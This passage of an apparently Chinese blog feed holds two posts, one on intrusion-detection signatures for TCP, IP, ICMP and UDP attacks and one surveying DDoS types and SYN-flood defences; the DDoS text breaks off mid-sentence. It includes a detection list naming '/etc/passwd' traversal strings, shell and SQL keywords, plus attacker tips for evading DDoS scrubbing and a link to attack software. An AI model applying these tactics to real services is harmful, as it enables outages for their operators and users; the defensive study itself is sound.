    <link href="http://yoursite.com/2019/01/01/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1/"/>
    <id>http://yoursite.com/2019/01/01/入侵检测与入侵防御/</id>
    <published>2019-01-01T07:34:15.000Z</published>
    <updated>2019-01-01T08:49:00.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="入侵行为的特征分类"><a href="#入侵行为的特征分类" class="headerlink" title="入侵行为的特征分类"></a>入侵行为的特征分类</h1><ul><li>利用某些终端协议机制缺陷，识别入侵行为；</li><li>利用畸形IP数据包特征，识别入侵行为；</li><li>利用TCP报文中的畸形标记组合，识别攻击行为；</li><li>利用日志或数据部分的特殊组合，识别入侵行为；</li><li>利用网络协议的缺陷，识别入侵行为。</li><li>针对ARP缺陷的攻击</li><li>ARP的作用是找出指定IP地址对应的MAC地址。</li><li>由请求主机以本网广播方式，发出ARP请求。目标主机以单播方式，向申请主机回应ARP应答信息，完成IP–&gt;MAC地址的过程。</li></ul><h1 id="入侵行为特征"><a href="#入侵行为特征" class="headerlink" title="入侵行为特征"></a>入侵行为特征</h1><h2 id="针对TCP标记的攻击"><a href="#针对TCP标记的攻击" class="headerlink" title="针对TCP标记的攻击"></a>针对TCP标记的攻击</h2><p>带有非法TCP标志组合的数据包：可通过对比TCP报头中的标志集与已知正确和错误标记组合的不同点来识别。</p><h3 id="TCP-SYN拒绝服务攻击"><a href="#TCP-SYN拒绝服务攻击" class="headerlink" title="TCP SYN拒绝服务攻击"></a>TCP SYN拒绝服务攻击</h3><p>攻击者向目标计算机发送大量的TCPSYN报文，不回应目标计算机的SYN+ACK报文，这样导致目标计算机一致处于等待状态，消耗目标计算机内存，直至瘫痪。一般，攻击者会采用大量虚假的源IP地址，对目标系统进行攻击。</p><p><strong>特征：</strong>伪造一个虚假的源IP地址仅发送一个SYN报文。</p><h3 id="SYN和FIN标志攻击"><a href="#SYN和FIN标志攻击" class="headerlink" title="SYN和FIN标志攻击"></a>SYN和FIN标志攻击</h3><p>攻击者向目标计算机发送一个TCP连接报文，将SYN标志和FIN标志都设置为1。这样的畸形报文，由于某些操作系统中，没有处理此类畸形报文的逻辑，造成目标系统瘫痪。</p><p><strong>特征：</strong>TCP报文的SYN和FIN标记都设置为1。</p><h3 id="没有设置任何标志的TCP报文攻击"><a href="#没有设置任何标志的TCP报文攻击" class="headerlink" title="没有设置任何标志的TCP报文攻击"></a>没有设置任何标志的TCP报文攻击</h3><p>正常情况下，任何TCP报文的SYN、FIN、ACK、RST、PSH五个标志中至少有一个标志为1。请求TCP报文设置SYN标志，后续报文都设置ACK标志。</p><p><strong>特征：</strong>攻击者发送的TCP报文所有的TCP标志位都为0。</p><h3 id="WinNuke攻击"><a href="#WinNuke攻击" class="headerlink" title="WinNuke攻击"></a>WinNuke攻击</h3><p>利用了WINDOWS操作系统的一个漏洞，向这个139端口发送一些携带TCP带外（OOB）数据报文，但其指针字段与数据的实际位置不符，某些版本的WINDOWS操作系统在处理这些数据的时候，系统就会崩溃。</p><h4 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h4><p>Windows系统TCP/IP</p><p>00B带外紧急数据拒绝</p><p>服务攻击漏洞</p><h4 id="影响系统"><a href="#影响系统" class="headerlink" title="影响系统"></a>影响系统</h4><ul><li>Windows NT 3.5</li><li>Windows 95</li></ul><h4 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul><li>攻击端口通常为139</li><li>被攻击服务器蓝屏</li></ul><h4 id="变种攻击"><a href="#变种攻击" class="headerlink" title="变种攻击"></a>变种攻击</h4><ul><li>WinNuke2</li><li>Pnuke</li></ul><h4 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h4><ul><li>防火墙过滤</li><li>打补丁</li></ul><p><strong>特征：</strong>带外数据长度与数据长度之和不等于真实数据部分长度。</p><h3 id="Land攻击"><a href="#Land攻击" class="headerlink" title="Land攻击"></a>Land攻击</h3><p>通过向一个目标计算机发送大量的TCP SYN报文，报文的源IP地址和目的IP地址是相同的，都是目标计算机的IP地址。这样目标计算机接收到这个SYN报文后，就会向该报文的源地址发送一个ACK报文，并建立一个TCP连接控制结构（TCB），而该报文的源地址就是自己，因此，这个ACK报文就发给了自己。这样目标计算机就会产生大量的处于半连接状态的TCB块，可能会耗尽内存，最终不能正常服务。<strong>这也是一种DOS攻击</strong>。</p><p><strong>特征：</strong>TCP SYN报文中，源IP与目的IP相同，均指向受害主机。</p><h2 id="针对IP缺陷的攻击"><a href="#针对IP缺陷的攻击" class="headerlink" title="针对IP缺陷的攻击"></a>针对IP缺陷的攻击</h2><p>利用畸形IP数据包特征，识别入侵行为。</p><h3 id="分片IP报文攻击"><a href="#分片IP报文攻击" class="headerlink" title="分片IP报文攻击"></a>分片IP报文攻击</h3><p>当一些较大的IP数据包通过MTU（最大传输单元）较小的网络，就需要进行分片传送。源主机或传输路径上的路由器，均可能进行分片。在IP报头中，与分片相关的有标志字段、分片偏移字段、分片许可位和分片标志位（MF）等，某些字段可用于指导接收方对IP分片的重组。</p><p>假如攻击者仅发送了其中的第一个分片或某个分片，其他的分片不发送，则接收方会等待一段时间（等待的时间视具体系统不同而不同），在超时后，接收方会丢弃受到的不完整分片。当攻击者发送大量的残缺分片，则接收方或因等待过多分片而耗尽内存，导致瘫痪。</p><p><strong>特征：</strong>属于某个原始IP数据包的分片没有全部发送，需要判断各分片之间是否满足关系，最后一个分片是否发送。</p><h3 id="滴泪攻击"><a href="#滴泪攻击" class="headerlink" title="滴泪攻击"></a>滴泪攻击</h3><p>假如攻击者对正常分片的情况进行修改，把偏移字段设置成不正确的值，在分片重组的时候，可能出现数据覆盖或断开的情况，就可能导致目标操作系统崩渍。</p><p>比如，将偏移字段值设置为0，150，370，555，会发生数据覆盖；而将其修改为0，185，370，580，则会出现数据断开，这就是所谓的泪滴攻击。</p><p><strong>特征：</strong>各分片之间偏移值、数据包长度、首部长度之间不满足紧密衔接关系。  </p><h3 id="带源路由选项的IP报文"><a href="#带源路由选项的IP报文" class="headerlink" title="带源路由选项的IP报文"></a>带源路由选项的IP报文</h3><p>源路由选项的目的，是指明IP数据包需要通过对中间设备（路由器），即指明了报文的传输路径。源路由选项有两类，一类是严格的源路由，另一类是松散的源路由。</p><p>这些带源路由选项的IP报文在传输的过程中，其源地址不断改变，目标地址也不断改变，因此，通过合适的设置源路由节点，攻击者便可以伪造一些合法的IP地址，而蒙混进入内部网络。</p><p><strong>特征：</strong>采用了源路由选项（代码131、137），其源路由列表中，存在伪造的IP地址（伪造一些访问控制设备允许进入内网的IP地址段，这些IP地址并不是路由器接口的IP）。</p><h3 id="记录路由选项的IP报文"><a href="#记录路由选项的IP报文" class="headerlink" title="记录路由选项的IP报文"></a>记录路由选项的IP报文</h3><p>记录路由选项也是一个IP选项，携带了该选项的IP报文，每经过一台路由器，该路由器便把自己的接口地址填在选项字段里面。这些报文在到达目的地的时候，选项的数据里面便记录了该报文经过的整个路径。</p><p>通过这样的报文可以很容易的判断该报文经过的路径，从而使攻击者可以很容易的寻找其中的攻击弱点。</p><p><strong>特征：</strong>有明显特征。一般做法是，在非调试状态下，禁止使用记录路由选项，对于记录路由选项的IP报文，均认为是入侵行为。</p><h3 id="未知协议字段的IP报文"><a href="#未知协议字段的IP报文" class="headerlink" title="未知协议字段的IP报文"></a>未知协议字段的IP报文</h3><p>在IP报文头中，有一个协议字段，指明了该IP报文承载了何种协议的数据。如果该字段值为1，则表明该IP报文承载了ICMP报文；6，则是TCP报文等。若攻击者将此字段设置为一个表示空协议的值，这样的报文可能对一些计算机操作系统的协议栈造成破坏。</p><p><strong>特征：</strong>IP数据包中的协议字段的值，不代表具体的某个协议。</p><h3 id="IP地址欺骗"><a href="#IP地址欺骗" class="headerlink" title="IP地址欺骗"></a>IP地址欺骗</h3><p>般情况下，路由器在转发报文的时候，只根据报文的目的地址查路由表，而不管报文的源地址是什么，攻击者向一台目标计算机发出一个报文，而把报文的源地址填写为第三方的一个IP地址，这样目标计算机便可能向毫无知觉的第三方计算机回应。</p><p><strong>特征：</strong>数据包的源IP地址字段值与其发送的报文的网络接口的IP地址不一致。</p><h2 id="针对ICMP缺陷的攻击"><a href="#针对ICMP缺陷的攻击" class="headerlink" title="针对ICMP缺陷的攻击"></a>针对ICMP缺陷的攻击</h2><h3 id="ICMP泛洪"><a href="#ICMP泛洪" class="headerlink" title="ICMP泛洪"></a>ICMP泛洪</h3><p>攻击者向目标计算机发送大量的ICMP ECHO请求报文（产生ICMP泛洪），则目标计算机会忙于处理并回应这些ECHO报文，而无法继续处理其它的网络数据报文，造成目标系统瘫痪。</p><p><strong>特征：</strong>攻击者发送ICMP ECHO报文太频繁，可设置一个阈值。</p><h3 id="死亡之ping"><a href="#死亡之ping" class="headerlink" title="死亡之ping"></a>死亡之ping</h3><p>TCP/IP规范要求IP报文的长度在一定范围内（比如，64B-64KB，但对发送方，没有此限制）。当接收到大于64KB长度的PING报文，可能导致目标系统IP协议栈崩溃，系统瘫痪。</p><p><strong>特征：</strong>ping数据包的长度大于常规长度大于64K-20。</p><h3 id="Smurf攻击"><a href="#Smurf攻击" class="headerlink" title="Smurf攻击"></a>Smurf攻击</h3><p>攻击者把ECHO的源地址设置为一个广播地址，在回复reply的时候，就会以广播地址为目的地址，这样本地网络上所有的计算机都必须处理这些广播报文。如果攻击者发送的ECHO请求报文足够多，产生的reply广播风暴，就可能把整个网络淹没。攻击者还可能把源地址设置为一个子网的广播地址或者受害者的主机的IP地址。</p><p>这样，该子网所在的计算机就可能受影响或者某个主机就会被ICMP REPLY淹没，造成瘫疾。</p><p><strong>特征：</strong>ECHO报文的源地址为网段广播地址或与发送者IP不同的地址。</p><h2 id="针对UDP攻击"><a href="#针对UDP攻击" class="headerlink" title="针对UDP攻击"></a>针对UDP攻击</h2><p>由于UDP协议是一种无连接的服务，攻击者可发送大量伪造源IP地址的小UDP包。但是，由于UDP协议是无连接性的，所以只要开了一个UDP服务的话，就可能被攻击。</p><p>UDP Flood是流量型DoS攻击。通常是利用大量UDP小包冲击DNS或Radius认证和流媒体视频服务器等提供UDP服务的服务器。</p><p><strong>特征：</strong>发送到目标IP的频率大于1k pps。小包攻击的UDP数据包，通常大小不大于200字节；打包攻击的UDP Flood数据包长通常大于1500字节。</p><p>UDP Flood非常难以检测，因为没有连接过程，无法建立连接状态。</p><h2 id="针对路由协议攻击"><a href="#针对路由协议攻击" class="headerlink" title="针对路由协议攻击"></a>针对路由协议攻击</h2><p>因特网的工作原理是由终端主机，将IP数据包发送给路由设备，然后由路由设备根据自身学习到的或者人工设定的路由表，将IP数据包按照接力转发的方式，最终送到目标IP地址。</p><p>路由信息自动更新，路由器要根据拓扑变化，重新计算路由，并快速扩散到各相关路由器。</p><p>发送虚假的路由更新报文，将导致消耗路由器资源、引起网络中断、甚至引起网络路由更新报文风暴，阻塞网络。</p><h2 id="内容特征"><a href="#内容特征" class="headerlink" title="内容特征"></a>内容特征</h2><p>URL中包含：<code>../../etc/passwd</code>，<code>../../etc/shadow</code></p><p>内容中包含：format、delete、copy、net、at、1s、mv、su、chgrp、chmod、chown、chattr、sudo、adduser、groupadd、kill等命令字</p><p>CREATE、BACKUP、drop、Alter、‘，–，delete、Insert、Union、update、exec等危险、敏感关键字猜测用户名密码的尝试、上传下载命令、修改显示备份删除文件操作、读取修改配置操作、注册表操作、cookie读取等操作</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;入侵行为的特征分类&quot;&gt;&lt;a href=&quot;#入侵行为的特征分类&quot; class=&quot;headerlink&quot; title=&quot;入侵行为的特征分类&quot;&gt;&lt;/a&gt;入侵行为的特征分类&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;利用某些终端协议机制缺陷，识别入侵行为；&lt;/li&gt;
&lt;li&gt;利用畸形IP
      
    
    </summary>
    
      <category term="入侵检测" scheme="http://yoursite.com/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>DDOS</title>
    <link href="http://yoursite.com/2018/12/28/DDOS/"/>
    <id>http://yoursite.com/2018/12/28/DDOS/</id>
    <published>2018-12-28T07:38:17.000Z</published>
    <updated>2018-12-28T09:36:49.303Z</updated>
    
    <content type="html"><![CDATA[<p><strong>DDOS攻击是一个世界级难题，并没有解决办法，只能缓解</strong></p><p>DDoS（Distributed Denial of Service，分布式拒绝服务）攻击的主要目的是让指定目标无法提供正常服务，甚至从互联网上消失，是目前最强大、最难防御的攻击之一。这是一个世界级的难题并没有解决办法只能缓解.</p><p>按照发起的方式，DDoS可以简单分为三类。</p><p><strong>第一类以力取胜</strong>，海量数据包从互联网的各个角落蜂拥而来，堵塞IDC入口，让各种强大的硬件防御系统、快速高效的应急流程无用武之地。这种类型的攻击典型代表是ICMP Flood和UDP Flood，现在已不常见。</p><p><strong>第二类以巧取胜</strong>，灵动而难以察觉，每隔几分钟发一个包甚至只需要一个包，就可以让豪华配置的服务器不再响应。这类攻击主要是利用协议或者软件的漏洞发起，例如Slowloris攻击、Hash冲突攻击等，需要特定环境机缘巧合下才能出现。</p><p><strong>第三类是上述两种的混合</strong>，轻灵浑厚兼而有之，既利用了协议、系统的缺陷，又具备了海量的流量，例如SYN Flood攻击、DNS Query Flood攻击，是当前的主流攻击方式。</p><h1 id="SYN-Flood"><a href="#SYN-Flood" class="headerlink" title="SYN Flood"></a>SYN Flood</h1><p>SYN Flood是互联网上最经典的DDOS攻击方式之一，他是利用了TCP三次握手的缺陷，能够以比较小的代价使目标服务器无法响应，且难以追查。</p><p>标准的TCP三次握手过程如下：</p><ul><li><p>客户端发送一个包含SYN标志的TCP报文，SYN即同步（Synchronize），同步报文会指明客户端使用的端口以及TCP连接的初始序号；</p></li><li><p>服务器在收到客户端的SYN报文后，将返回一个SYN+ACK（即确认Acknowledgement）的报文，表示客户端的请求被接受，同时TCP初始序号自动加1；</p></li><li><p>客户端也返回一个确认报文ACK给服务器端，同样TCP序列号被加1。</p></li></ul><p>经过这三步，TCP连接就建立完成。</p><p>TCP协议为了实现可靠传输，在三次握手的过程中设置了一些异常处理机制。第三步中如果服务器没有收到客户端的最终ACK确认报文，会一直处于SYN_RECV状态，将客户端IP加入等待列表，并重发第二部的SYN+ACK报文。一般重发3-5次，大约间隔30秒左右轮询一次等待列表重试所有客户端。</p><p>另一方面，服务器在自己发出了SYN+ACK报文后，会预分配资源为即将建立的TCP连接储存信息做准备，这个资源在等待重试期间一直保留。更为重要的是，服务器资源有限，可以维护的SYN_RECV状态超过基线后就不再接受新的SYN报文，也就是拒绝新的TCP连接建立。</p><p>攻击者可以伪装大量的IP地址给服务器发送SYN报文，由于伪造的IP地址几乎不可能存在，也就几乎没有设备会给服务器返回任何应答了。因此，服务器将会维持一个庞大的等待列表，不停的重试发送SYN+ACK报文，同时占用着大量的资源无法释放。更为关键的是，被攻击服务器的SYN_RECV队列被恶意的数据包占满，不再接受新的SYN请求，合法用户无法建立TCP连接。</p><h2 id="攻击软件"><a href="#攻击软件" class="headerlink" title="攻击软件"></a>攻击软件</h2><p>DarkShell</p><p><a href="http://www.77169.org/hack/201508/205870.shtm" target="_blank" rel="noopener">http://www.77169.org/hack/201508/205870.shtm</a></p><h1 id="DNS-Query-Flood"><a href="#DNS-Query-Flood" class="headerlink" title="DNS Query Flood"></a>DNS Query Flood</h1><p>作为互联网最基础、最核心的服务，DNS自然也是DDOS攻击的重要目标之一。</p><p>UDP攻击是最容易发起海量流量的攻击手段，而且源IP随机伪造难以追查，但是过滤比较容易，因为大多数IP并不提供UDP服务，直接丢弃UDP流量即可。所以现在纯粹的UDP流量攻击少见了，取而代之的是UDP协议承载的DNS Query Flood攻击。简单的说，越上层协议上发动的DDOS攻击越难以防御，因为协议越上层，与业务关联越大，防御系统面临的情况就越复杂。</p><p>DNS Query Flood就是攻击者操控大量肉机，对目标发起海量的域名查询请求。为了防止基于ACL的过滤，比如提高数据包的随机性，常用做法是UDP层随机伪造源IP地址、随机伪造源端口等参数。在DNS协议层，随机伪造查询ID以及待解析域名。随机伪造待解析域名除了防止过滤外，还可以降低命中DNS缓存的可能性，尽可能多的消耗DNS服务器的CPU资源。</p><h1 id="HTTP-Flood"><a href="#HTTP-Flood" class="headerlink" title="HTTP Flood"></a>HTTP Flood</h1><p>上文描述的SYN Flood、DNS Query Flood在现阶段已经能做到有效防御了，真正令各大厂商以及互联网企业头疼的是HTTP Flood攻击。HTTP Flood是针对Web服务在第七层协议发起的攻击。</p><p>它的巨大危害性主要表现在三个方面：</p><ul><li>发起方便</li><li>过滤困难</li><li>影响深远</li></ul><p>SYN Flood和DNS Query Flood都需要攻击者以root权限控制大批量的肉机。收集大量root权限的肉鸡很花费时间和精力，而且在攻击过程中肉鸡会由于流量异常被管理员发现，攻击者的资源快速损耗而补充缓慢，导致攻击强度明显降低而且不可长期持续。</p><p>HTTP Flood攻击则不同，攻击者并不需要控制大批的肉机，取而代之的是通过端口扫描程序在互联网上寻找匿名的HTTP代理或者SOCKS代理，攻击者通过匿名代理对攻击目标发起HTTP请求。匿名代理是一种比较丰富的资源，花几天时间获取代理并不是难事，因此攻击容易发起而且可以长期高强度的持续。</p><p>另一方面，HTTP Flood攻击在HTTP层发起，极力模仿正常用户的网页请求行为，与网站业务紧密相关，安全厂商很难提供一套通用的且不影响用户体验的方案。在一个地方工作得很好的规则，换一个场景可能带来大量的误杀。</p><p>最后，HTTP Flood攻击会引起严重的连锁反应，不仅仅是直接导致被攻击的Web前端响应缓慢，还间接攻击到后端的Java等业务层逻辑以及更后端的数据库服务，增大它们的压力，甚至对日志存储服务器都带来影响。</p><p>有意思的是，HTTP Flood还有个呢称叫CC攻击。</p><h1 id="慢速连接攻击"><a href="#慢速连接攻击" class="headerlink" title="慢速连接攻击"></a>慢速连接攻击</h1><p>提起攻击，第一反应就是海量的流量、海量的报文。但有一种攻击却反其道而行之，以慢著称，以至于有些攻击目标被打死了都不知道是怎么死的，这就是慢速连接攻击，最具代表性的是rsnake发明的<strong>Slowloris</strong>。　</p><p>HTTP协议规定，HTTP Request以<code>\r\n\r\n</code>结尾表示客户端发送结束，服务端开始处理。那么，如果永远不发送<code>\r\n\r\n</code>会如何？Slowloris就是利用这一点来做DDoS攻击的。攻击者在HTTP请求头中将Connection设置为Keep-Alive，要求Web Server保持TCP连接不要断开，随后缓慢地每隔几分钟发送一个key-value格式的数据到服务端，如<code>a:b\r\n</code>，导致服务端认为HTTP头部没有接收完成而一直等待。如果攻击者使用多线程或者傀儡机来做同样的操作，服务器的Web容器很快就被攻击者占满了TCP连接而不再接受新的请求。</p><p>很快的，Slowloris开始出现各种变种。比如POST方法向Web Server提交数据、填充一大大Content-Length但缓慢的一个字节一个字节的POST真正数据内容等等。</p><h1 id="DDOS混合攻击"><a href="#DDOS混合攻击" class="headerlink" title="DDOS混合攻击"></a>DDOS混合攻击</h1><p>高级攻击者从来不会使用单一的手段进行攻击，而是根据目标环境灵活组合。普通的SYN Flood容易被流量清洗设备通过反向探测、SYN Cookie等技术手段过滤掉，</p><p>但如果在SYN Flood中混入SYN+ACK数据包，使每一个伪造的SYN数据包都有一个与之对应的伪造的客户端确认报文，这里的对应是指源IP地址、源端口、目的IP、目的端口、TCP窗口大小、TTL等都符合同一个主机同一个TCP Flow的特征，流量清洗设备的反向探测和SYN Cookie性能压力将会显著增大。其实SYN数据报文配合其他各种标志位，都有特殊的攻击效果，这里不一一介绍。对DNS Query Flood而言，也有独特的技巧。</p><p>首先，DNS可以分为普通DNS和授权域DNS，攻击普通DNS，IP地址需要随机伪造，并且指明服务器要求做递归解析；但攻击授权域DNS，伪造的源IP地址则不应该是纯随机的，而应该是事先收集的全球各地ISP的DNS地址，这样才能达到最大攻击效果，使流量清洗设备处于添加IP黑名单还是不添加IP黑名单的尴尬处境。添加会导致大量误杀，不添加黑名单则每个报文都需要反向探测从而加大性能压力。</p><p>另一方面，前面提到，为了加大清洗设备的压力不命中缓存而需要随机化请求的域名，但需要注意的是，待解析域名必须在伪造中带有一定的规律性，比如说只伪造域名的某一部分而固化一部分，用来突破清洗设备设置的白名单。道理很简单，腾讯的服务器可以只解析腾讯的域名，完全随机的域名可能会直接被丢弃，需要固化。但如果完全固定，也很容易直接被丢弃，因此又需要伪造一部分。</p><p>其次，对DNS的攻击不应该只着重于UDP端口，根据DNS协议，TCP端口也是标准服务。在攻击时，可以UDP和TCP攻击同时进行。</p><p>HTTP Flood的着重点，在于突破前端的cache，通过HTTP头中的字段设置直接到达Web Server本身。另外，HTTP Flood对目标的选取也非常关键，一般的攻击者会选择搜索之类需要做大量数据查询的页面作为攻击目标，这是非常正确的，可以消耗服务器尽可能多的资源。但这种攻击容易被清洗设备通过人机识别的方式识别出来，那么如何解决这个问题？很简单，尽量选择正常用户也通过APP访问的页面，一般来说就是各种Web API。正常用户和恶意流量都是来源于APP，人机差别很小，基本融为一体难以区分。</p><p>之类的慢速攻击，是通过巧妙的手段占住连接不释放达到攻击的目的，但这也是双刃剑，每一个TCP连接既存在于服务端也存在于自身，自身也需要消耗资源维持TCP状态，因此连接不能保持太多。如果可以解决这一点，攻击性会得到极大增强，也就是说Slowloris可以通过stateless的方式发动攻击，在客户端通过嗅探捕获TCP的序列号和确认维护TCP连接，系统内核无需关注TCP的各种状态变迁，一台笔记本即可产生多达65535个TCP连接。</p><p>前面描述的，都是技术层面的攻击增强。在人的方面，还可以有一些别的手段。如果SYN Flood发出大量数据包正面强攻，再辅之以Slowloris慢速连接，多少人能够发现其中的秘密？即使服务器宕机了也许还只发现了SYN攻击想去加强TCP层清洗而忽视了应用层的行为。种种攻击都可以互相配合，达到最大的效果。攻击时间的选择，也是一大关键，比如说选择维护人员吃午饭时、维护人员下班堵在路上或者在地铁里无线上网卡都没有信号时、目标企业在举行大规模活动流量飙升时等。</p><h1 id="来自P2P网络的攻击"><a href="#来自P2P网络的攻击" class="headerlink" title="来自P2P网络的攻击"></a>来自P2P网络的攻击</h1><p>前面的攻击方式，多多少少都需要一些傀儡机，即使是HTTP Flood也需要搜索大量的匿名代理。如果有一种攻击，只需要发出一些指令，就有机器自动上来执行，才是完美的方案。这种攻击已经出现了，那就是来自P2P网络的攻击。</p><p>大家都知道，互联网上的P2P用户和流量都是一个极为庞大的数字。如果他们都去一个指定的地方下载数据，使成千上万的真实IP地址连接过来，没有哪个设备能够支撑住。拿BT下载来说，伪造一些热门视频的种子，发布到搜索引擎，就足以骗到许多用户和流量了，但这只是基础攻击。</p><p>高级P2P攻击，是直接欺骗资源管理服务器。如迅雷客户端会把自己发现的资源上传到资源管理服务器，然后推送给其他需要下载相同资源的用户，这样，一个链接就发布出去。通过协议逆向，攻击者伪造出大批量的热门资源信息通过资源管理中心分发出去，瞬间就可以传遍整个P2P网络。更为恐怖的是，这种攻击是无法停止的，即使是攻击者自身也无法停止，攻击一直持续到P2P官方发现问题更新服务器且下载用户重启下载软件时为止。</p><h1 id="CC"><a href="#CC" class="headerlink" title="CC"></a>CC</h1><p>ChallengeCollapsar的名字源于挑战国内知名安全厂商绿盟的抗DDOS设备-“黑洞”，通过botnet的傀儡主机或寻找匿名代理服务器，向目标发起大量真实的http请求，最终消耗掉大量的并发资源，拖慢整个网站甚至彻底拒绝服务。</p><p>互联网的架构追求扩展性本质上是为了提高并发能力，各种SQL性能优化措施：消除慢查询、分表分库、索引、优化数据结构、限制搜索频率等本质都是为了解决资源消耗，而CC大有反其道而行之的意味，占满服务器并发连接数，尽可能使请求避开缓存而直接读数据库，读数据库要找最消耗资源的查询，最好无法利用索引，每个查询都全表扫描，这样就能用最小的攻击资源起到最大的拒绝服务效果。</p><p>互联网产品和服务依靠数据分析来驱动改进和持续运营，所以除了前端的APP、中间件和数据库这类OLTP系统，后面还有OLAP，从日志收集，存储到数据处理和分析的大数据平台，当CC攻击发生时，不仅OLTP的部分受到了影响，实际上CC会产生大量日志，直接会对后面的OLAP产生影响，影响包括两个层面，一个当日的数据统计完全是错误的。第二个层面因CC期间访问日志剧增也会加大后端数据处理的负担。</p><p>CC是目前应用层攻击的主要手段之一，在防御上有一些方法，但不能完美解决这个问题。</p><h1 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h1><p>2004年时DRDOS第一次披露，通过将SYN包的源地址设置为目标地址，然后向大量的</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyml7onr3hj30hs08474k.jpg" alt=""></p><p>真实TCP服务器发送TCP的SYN包，而这些收到SYN包的TCP server为了完成3次握手把SYN|ACK包“应答”给目标地址，完成了一次“反射”攻击，攻击者隐藏了自身，但有个问题是攻击者制造的流量和目标收到的攻击流量是1:1，且SYN|ACK包到达目标后马上被回以RST包，整个攻击的投资回报率不高。</p><p>反射型攻击的本质是利用“质询-应答”式协议，将质询包的源地址通过原始套接字伪造设置为目标地址，则应答的“回包”都被发送至目标，如果回包体积比较大或协议支持递归效果，攻击流量会被放大，成为一种高性价比的流量型攻击。</p><p>反射型攻击利用的协议目前包括NTP、Chargen、SSDP、DNS、RPC portmap等等。</p><h1 id="流量放大型"><a href="#流量放大型" class="headerlink" title="流量放大型"></a>流量放大型</h1><p>以上面提到的DRDOS中常见的SSDP协议为例，攻击者将Searchtype设置为ALL，搜索所有可用的设备和服务，这种递归效果产生的放大倍数是非常大的，攻击者只需要以较小的伪造源地址的查询流量就可以制造出几十甚至上百倍的应答流量发送至目标。</p><h1 id="防御基础"><a href="#防御基础" class="headerlink" title="防御基础"></a>防御基础</h1><p> <strong>攻击流量到底多大，这是一个关键问题。攻击量的大小。用的防护方法不一样。下面给你讲一讲，1G之内的防护方式。费用在，&lt;1万，每月</strong></p><p>谈到DDoS防御，首先就是要知道到底遭受了多大的攻击。这个问题看似简单，实际上却有很多不为人知的细节在里面。</p><p>以SYN Flood为例，为了提高发送效率在服务端产生更多的SYN等待队列，攻击程序在填充包头时，IP首部和TCP首部都不填充可选的字段，因此IP首部长度恰好是20字节，TCP首部也是20字节，共40字节。</p><p>对于以太网来说，最小的包长度数据段必须达到46字节，而攻击报文只有40字节，因此，网卡在发送时，会做一些处理，在TCP首部的末尾，填充6个0来满足最小包的长度要求。这个时候，整个数据包的长度为14字节的以太网头，20字节的IP头，20字节的TCP头，再加上因为最小包长度要求而填充的6个字节的0，一共是60字节。</p><p>但这还没有结束。以太网在传输数据时，还有CRC检验的要求。网卡会在发送数据之前对数据包进行CRC检验，将4字节的CRC值附加到包头的最后面。这个时候，数据包长度已不再是40字节，而是变成64字节了，这就是常说的SYN小包攻击，数据包结构如下：</p><pre><code>|14字节以太网头部|20字节IP头部|20字节TCP|6字节填充|4字节检验||目的MAC|源MAC|协议类型| IP头 |TCP头|以太网填充 | CRC检验 |</code></pre><p>到64字节时，SYN数据包已经填充完成，准备开始传输了。攻击数据包很小，远远不够最大传输单元（MTU）的1500字节，因此不会被分片。那么这些数据包就像生产流水线上的罐头一样，一个包连着一个包紧密地挤在一起传输吗？事实上不是这样的。</p><p>以太网在传输时，还有前导码（preamble）和帧间距（inter-frame gap）。其中前导码占8字节（byte），即64比特位。前导码前面的7字节都是10101010，1和0间隔而成。但第八个字节就变成了10101011，当主机监测到连续的两个1时，就知道后面开始是数据了。在网络传输时，数据的结构如下：</p><pre><code>|8字节前导码|6字节目的MAC地址|6字节源MAC地址|2字节上层协议类型|20字节IP头|20字节TCP头|6字节以太网填充|4字节CRC检验|12字节帧间距|</code></pre><p>也就是说，一个本来只有40字节的SYN包，在网络上传输时占的带宽，其实是84字节。</p><p>有了上面的基础，现在可以开始计算攻击流量和网络设备的线速问题了。当只填充IP头和TCP头的最小SYN包跑在以太网络上时，100Mbit的网络，能支持的最大PPS（Packet Per Second）是100×106 / (8 * (64+8+12)) = 148809，1000Mbit的网络，能支持的最大PPS是1488090。</p><h1 id="SYN-Flood防御"><a href="#SYN-Flood防御" class="headerlink" title="SYN Flood防御"></a>SYN Flood防御</h1><p>前文描述过，SYN Flood攻击大量消耗服务器的CPU、内存资源，并占满SYN等待队列。相应的，我们修改内核参数即可有效缓解。主要参数如下：</p><pre><code>net.ipv4.tcp_syncookies = 1net.ipv4.tcp_max_syn_backlog = 8192net.ipv4.tcp_synack_retries = 2</code></pre><p>分别为启用SYN Cookie、设置SYN最大队列长度以及设置SYN+ACK最大重试次数。</p><p>SYN Cookie的作用是缓解服务器资源压力。启用之前，服务器在接到SYN数据包后，立即分配存储空间，并随机化一个数字作为SYN号发送SYN+ACK数据包。然后保存连接的状态信息等待客户端确认。启用SYN Cookie之后，服务器不再分配存储空间，而且通过基于时间种子的随机数算法设置一个SYN号，替代完全随机的SYN号。发送完SYN+ACK确认报文之后，清空资源不保存任何状态信息。直到服务器接到客户端的最终ACK包，通过Cookie检验算法鉴定是否与发出去的SYN+ACK报文序列号匹配，匹配则通过完成握手，失败则丢弃。当然，前文的高级攻击中有SYN混合ACK的攻击方法，则是对此种防御方法的反击，其中优劣由双方的硬件配置决定</p><p><code>tcp_max_syn_backlog</code>则是使用服务器的内存资源，换取更大的等待队列长度，让攻击数据包不至于占满所有连接而导致正常用户无法完成握手。<code>net.ipv4.tcp_synack_retries</code>是降低服务器SYN+ACK报文重试次数，尽快释放等待资源。这三种措施与攻击的三种危害一一对应，完完全全地对症下药。但这些措施也是双刃剑，可能消耗服务器更多的内存资源，甚至影响正常用户建立TCP连接，需要评估服务器硬件资源和攻击大小谨慎设置。</p><p>除了定制TCP/IP协议栈之外，还有一种常见做法是TCP首包丢弃方案，利用TCP协议的重传机制识别正常用户和攻击报文。当防御设备接到一个IP地址的SYN报文后，简单比对该IP是否存在于白